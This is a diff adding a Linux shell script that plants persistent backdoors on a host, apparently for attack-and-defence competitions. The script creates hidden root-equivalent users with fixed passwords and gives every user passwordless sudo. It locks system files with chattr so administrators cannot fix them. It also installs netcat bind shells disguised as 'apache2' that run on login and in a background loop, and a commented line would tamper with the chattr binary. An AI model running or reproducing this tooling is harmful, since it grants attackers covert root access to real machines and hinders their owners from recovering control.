@@ -1,0 +1,53 @@
+ifconfig | grep 192\.168
+
+# Make mutable
+chattr -i /etc/shadow
+chattr -i /etc/sudoers
+
+# Backdoor user
+useradd -u 0 -o backupsys
+printf "meow\nmeow\n" | passwd backupsys
+echo meow | passwd --stdin backupsys 2>/dev/null
+
+# Less-sneaky backdoor user
+useradd user123
+echo "user123:meow" | chpasswd
+usermod -aG sudo,root user123
+
+# Other backdoor user
+useradd -u 0 -o kitten
+printf "meow\nmeow\n" | passwd kitten
+echo meow | passwd --stdin kitten 2>/dev/null
+
+# No more user changes
+chattr +iu /etc/shadow
+chattr +iu /etc/passwd
+
+# Give everybody sudo
+echo '* ALL=(ALL)NOPASSWD:ALL' >> /etc/sudoers
+chattr +iu /etc/sudoers
+       
+# Don't let them "fix" SSH
+chattr +iu /etc/ssh/sshd_config
+
+# Maybe allow SSH a bit better
+iptables -P INPUT ACCEPT
+iptables -P OUTPUT ACCEPT
+iptables -I INPUT -p tcp --dport 22 -j ACCEPT
+iptables -I INPUT -p tcp --dport 22331 -j ACCEPT
+
+# Log what they're doing a bit better
+echo 'shopt -s histappend' >> /root/.bashrc
+echo 'export PROMPT_COMMAND="history -a; history -c; history -r; $PROMPT_COMMAND"' >> /root/.bashrc
+echo 'export HISTTIMEFORMAT="%d/%m/%y %T "' >> /root/.bashrc
+# Shell every time someone logs in
+echo 'A=/tmp/.$RANDOM; rm -f $A; mkfifo $A; exec -a apache2 nc -lp 41131 <$A 2>/dev/null | exec -a apache2 bash >$A 2>&1 &' >> /root/.bashrc
+chattr +iu /root/.bashrc
+
+# Listen from the get-go
+nohup /bin/bash -c 'echo "while :; do rm -f /tmp/.shf 2>/dev/null; mkfifo /tmp/.shf; exec -a apache2 /bin/bash </tmp/.shf 2>&1 | exec -a aapche2 nc -lp 22331 >/tmp/.shf 2>/dev/null; sleep 300; done" | nohup /bin/bash >/dev/null 2>&1 &' >/dev/null 2>&1 &
+
+# Pending approval:
+# touch -r /usr/bin/chattr; mv /usr/bin/chattr /usr/bin/chattr.bak; touch -r /tmp/.x /usr/bin/chattr.bak
+
+date > /tmp/.x
